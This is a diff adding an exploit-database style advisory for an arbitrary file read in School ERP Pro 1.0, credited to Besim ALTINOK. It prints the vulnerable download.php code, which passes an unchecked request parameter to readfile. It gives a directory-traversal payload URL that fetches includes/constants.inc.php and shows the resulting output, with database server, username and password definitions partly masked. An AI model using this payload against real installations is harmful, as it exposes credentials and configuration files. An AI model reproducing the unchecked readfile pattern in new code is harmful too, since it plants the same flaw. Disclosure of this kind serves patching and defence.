@@ -1,0 +1,42 @@
+# Exploit Title: School ERP Pro 1.0 - Arbitrary File Read
+# Date: 2020-04-28
+# Author: Besim ALTINOK
+# Vendor Homepage: http://arox.in
+# Software Link: https://sourceforge.net/projects/school-erp-ultimate/
+# Version: latest version
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+# CVE: N/A
+
+Vulnerable code: (/student_staff/download.php)
+- File Name: download.php
+- Content of the download.php
+
+<?php
+if ( isset($_REQUEST["document"])&&$_REQUEST["document"]!="") {
+$file = $_REQUEST['document'];
+header("Content-type: application/force-download");
+header("Content-Transfer-Encoding: Binary");
+header("Content-length: ".filesize($file));
+header("Content-disposition: attachment; filename=\"".$file."\"");
+readfile($file);
+exit;
+}
+?>
+
+------------
+*Payload:*
+---------------
+
+http://localhost/school_erp/student_staff/download.php?document=../includes/constants.inc.php
+------------------------
+*After run payload: (we accessed of the file content)*
+------------------------
+
+<?php
+
+  define('DB_SERVER', 'localhost');
+  define('DB_SERVER_USERNAME', 'aroxi********');
+  define('DB_SERVER_PASSWORD', 'erp**********');
+  define('DB_DATABASE', 'aroxi****************');
+?>
